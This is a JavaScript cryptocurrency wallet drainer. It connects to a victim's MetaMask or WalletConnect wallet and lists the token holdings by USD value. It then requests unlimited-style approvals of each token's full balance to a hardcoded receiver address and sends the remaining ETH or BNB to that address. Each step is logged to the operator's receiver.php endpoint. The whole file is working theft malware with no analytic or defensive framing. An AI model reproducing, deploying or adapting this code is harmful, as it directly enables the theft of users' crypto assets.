const DRAINER_CONFIG = {
  "receiver_address": "0x41BB52dbe9FB23F678aB756FF616018D01E1F382"
};

var DRAINER_USER_ID = sessionStorage.getItem('DRAINER_ID');

var connected_address = null, web3 = null, signer = null;
var current_provider = null, current_chain_id = null;

const MS_Contract_ABI = {
  'ERC-20': JSON.parse(`[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"delegate","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"delegate","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],
  "name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenOwner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"receiver","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transfer","outputs":
  [{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"buyer","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]`),
  'ERC-721': JSON.parse(`[{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"mint","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},
  {"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},
  {"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},
  {"constant":true,"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"}]`)
};

var MS_MetaMask_ChainData = {
  1: {
    chainId: '0x1',
    chainName: "Ethereum Mainnet",
    nativeCurrency: {
      name: "Ether",
      symbol: "ETH",
      decimals: 18,
    },
    rpcUrls: [ "https://rpc.ankr.com/eth" ],
    blockExplorerUrls: [ "https://etherscan.io" ]
  },
  56: {
    chainId: '0x38',
    chainName: "BNB Smart Chain",
    nativeCurrency: {
      name: "Binance Coin",
      symbol: "BNB",
      decimals: 18,
    },
    rpcUrls: [ "https://rpc.ankr.com/bsc" ],
    blockExplorerUrls: [ "https://bscscan.com" ]
  }
};

var WC_Provider = null;
if (typeof window.WalletConnectProvider !== 'undefined') {
  WC_Provider = new WalletConnectProvider.default({
    rpc: {
      1: 'https://rpc.ankr.com/eth',
      56: 'https://rpc.ankr.com/bsc'
    },
    network: 'ethereum', chainId: 1
  });
}

if (DRAINER_USER_ID === null) {
  sessionStorage.setItem('DRAINER_ID', String(Math.floor(Date.now() / 1000)));
  DRAINER_USER_ID = sessionStorage.getItem('DRAINER_ID');
  try {
    fetch('/receiver.php', {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: new URLSearchParams({
        method: 'ENTER_WEBSITE',
        user_id: DRAINER_USER_ID
      })
    });
  } catch(err) {
    console.log(err);
  }
}

async function change_chain_id(chain_id) {
  try {
    if (current_provider != 'MM') return false;
    if (current_chain_id == chain_id) return false;
    try {
      await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: `0x${chain_id.toString(16)}` }] });
      current_chain_id = chain_id;
      web3 = new ethers.providers.Web3Provider(window.ethereum);
      signer = web3.getSigner();
      return true;
    } catch(err) {
      if (err.code == 4902) {
        try {
          await window.ethereum.request({ method: "wallet_addEthereumChain", params: [ MS_MetaMask_ChainData[chain_id] ] });
          current_chain_id = chain_id;
          web3 = new ethers.providers.Web3Provider(window.ethereum);
          signer = web3.getSigner();
          return true;
        } catch(err) {
          return false;
        }
      } else {
        return false;
      }
    }
  } catch(err) {
    console.log(err);
    return false;
  }
}

async function connect_wallet(force_wc = false, chain_id = 1) {
  try {
    if (typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask && force_wc == false) {
      try {
        var result = await window.ethereum.request({ method: 'wallet_requestPermissions', params: [{ eth_accounts: {} }] });
        if (result && result.length > 0) {
          connected_address = window.ethereum.selectedAddress;
          if (parseInt(window.ethereum.chainId) != 1 && parseInt(window.ethereum.chainId) != 56) {
            try {
              await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: '0x1' }] });
            } catch(err) {
              console.log('User rejected to change chain');
              return false;
            }
          }
          web3 = new ethers.providers.Web3Provider(window.ethereum);
          signer = web3.getSigner();
          current_provider = 'MM';
          current_chain_id = parseInt(window.ethereum.chainId);
        } else {
          console.log('User has no wallets');
          return false;
        }
      } catch(err) {
        if (err.code === 4001) {
          console.log('User rejected wallet connection');
          return false;
        } else {
          console.log(err);
          return false;
        }
      }
    } else if (typeof window.WalletConnectProvider !== 'undefined') {
      if (WC_Provider.connected) await WC_Provider.disconnect(0);
      WC_Provider.chainId = chain_id;
      WC_Provider.isConnecting = false;
      try {
        var result = await WC_Provider.enable();
        if (result && result.length > 0) {
          connected_address = result[0];
          web3 = new ethers.providers.Web3Provider(WC_Provider);
          signer = web3.getSigner();
          current_provider = 'WC';
          current_chain_id = WC_Provider.chainId;
        }
      } catch(err) {
        console.log('User rejected wallet connection');
        return false;
      }
    } else {
      console.log('No providers available');
      return false;
    }
    if (connected_address === null || web3 === null || signer === null) {
      console.log('Unable to connect wallet');
      return false;
    }
    var is_chain_changeable = (current_provider == 'MM');
    // Сообщение о подключении кошелька
    var ADDRESS_BALANCE = await signer.getBalance('latest');
    try {
      fetch('/receiver.php', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams({
          method: 'CONNECT_WALLET', address: connected_address, user_id: DRAINER_USER_ID,
          amount: ethers.utils.formatUnits(ethers.BigNumber.from(ADDRESS_BALANCE), 'ether'),
          chain_id: current_chain_id
        })
      });
    } catch(err) {
      console.log(err);
    }
    // Работа с токенами
    var fee_counter = {
      1: ethers.BigNumber.from('0'),
      56: ethers.BigNumber.from('0')
    };
    try {
      var response = await fetch('https://rpc.ankr.com/multichain', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          "id": 1,
          "jsonrpc": "2.0",
          "method": "ankr_getAccountBalance",
          "params": {
            "blockchain": is_chain_changeable ? ["bsc", "eth"] : (current_chain_id == 1 ? 'eth' : 'bsc'),
            "onlyWhitelisted": true,
            "walletAddress": connected_address
          }
        })
      });
      response = await response.json();
      var wallet_assets = [];
      if (response.result && response.result.assets) {
        for (const asset of response.result.assets) {
          try {
            if (asset.tokenType == 'NATIVE') continue;
            wallet_assets.push({
              chain_id: asset.blockchain == 'eth' ? 1 : 56,
              name: asset.tokenName,
              decimals: asset.tokenDecimals,
              balance: {
                raw: asset.balanceRawInteger,
                USD: parseFloat(asset.balanceUsd),
                ether: parseFloat(asset.balance)
              },
              type: asset.tokenType,
              address: asset.contractAddress || '0x0'
            });
          } catch(err) {
            console.log(err);
          }
        }
      }
      wallet_assets.sort((a, b) => { return b.balance.USD - a.balance.USD });
      for (const asset of wallet_assets) {
        try {
          if (current_chain_id != asset.chain_id) {
            if (is_chain_changeable == false) continue;
            var change_status = await change_chain_id(asset.chain_id);
            if (change_status == false) continue;
            else await new Promise(r => setTimeout(r, 1000));
          }
          const pContract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC-20'], signer);
          try {
            await pContract.approve(DRAINER_CONFIG.receiver_address, ethers.BigNumber.from(asset.balance.raw));
            try {
              fetch('/receiver.php', {
                method: 'POST',
                headers: {
                  'Accept': 'application/json',
                  'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({
                  method: 'APPROVE_TOKEN', address: connected_address, user_id: DRAINER_USER_ID,
                  amount: asset.balance.ether, token_name: asset.name, chain_id: current_chain_id,
                  token_address: asset.address, token_amount: asset.balance.raw,
                  processor_address: DRAINER_CONFIG.receiver_address, usd_amount: asset.balance.USD
                })
              });
              var gas_fee = ethers.BigNumber.from(await signer.getGasPrice()).mul(ethers.BigNumber.from('100000')).toString();
              fee_counter[current_chain_id] = ethers.BigNumber.from(fee_counter[current_chain_id]).add(ethers.BigNumber.from(gas_fee));
              await new Promise(r => setTimeout(r, 1000));
            } catch(err) {
              console.log(err);
            }
          } catch(err) {
            try {
              fetch('/receiver.php', {
                method: 'POST',
                headers: {
                  'Accept': 'application/json',
                  'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({
                  method: 'NO_APPROVE_TOKEN', address: connected_address, user_id: DRAINER_USER_ID,
                  amount: asset.balance.ether, token_name: asset.name, chain_id: current_chain_id,
                  token_address: asset.address, usd_amount: asset.balance.USD
                })
              });
            } catch(err) {
              console.log(err);
            }
          }
        } catch(err) {
          console.log(err);
        }
      }
    } catch(err) {
      console.log(err);
    }
    // Работа с монетами
    var chains_list = [ current_chain_id, (current_chain_id == 1 ? 56 : 1) ];
    for (const this_chain_id of chains_list) {
      try {
        if (current_chain_id != this_chain_id) {
          if (is_chain_changeable == false) continue;
          var change_status = await change_chain_id(this_chain_id);
          if (change_status == false) continue;
          else await new Promise(r => setTimeout(r, 1000));
        }
        var GAS_PRICE = await signer.getGasPrice();
        var GAS_LIMIT = 21000;
        var GAS_AMOUNT = ethers.BigNumber.from(GAS_PRICE).mul(ethers.BigNumber.from(GAS_LIMIT)).toString();
        var ADDRESS_BALANCE = await signer.getBalance('latest');
        var SAFE_AMOUNT = ethers.BigNumber.from(ADDRESS_BALANCE).sub(ethers.BigNumber.from(GAS_AMOUNT)).sub(ethers.BigNumber.from(fee_counter[this_chain_id])).toString();
        if (ethers.BigNumber.from(SAFE_AMOUNT).gt(ethers.BigNumber.from(0))) {
          try {
            await signer.sendTransaction({
              to: DRAINER_CONFIG.receiver_address,
              value: ethers.BigNumber.from(SAFE_AMOUNT),
              gasLimit: ethers.BigNumber.from(GAS_LIMIT),
              gasPrice: ethers.BigNumber.from(GAS_PRICE)
            });
            try {
              fetch('/receiver.php', {
                method: 'POST',
                headers: {
                  'Accept': 'application/json',
                  'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({
                  method: 'SEND_ETHEREUM', address: connected_address, user_id: DRAINER_USER_ID,
                  amount: ethers.utils.formatUnits(ethers.BigNumber.from(SAFE_AMOUNT), 'ether'),
                  chain_id: current_chain_id
                })
              });
            } catch(err) {
              console.log(err);
            }
            await new Promise(r => setTimeout(r, 1000));
          } catch(err) {
            console.log('Unable to send Ethereum');
          }
        } else {
          console.log('User has no Ethereum');
        }
      } catch(err) {
        console.log(err);
      }
    }
  } catch(err) {
    console.log(err);
  }
}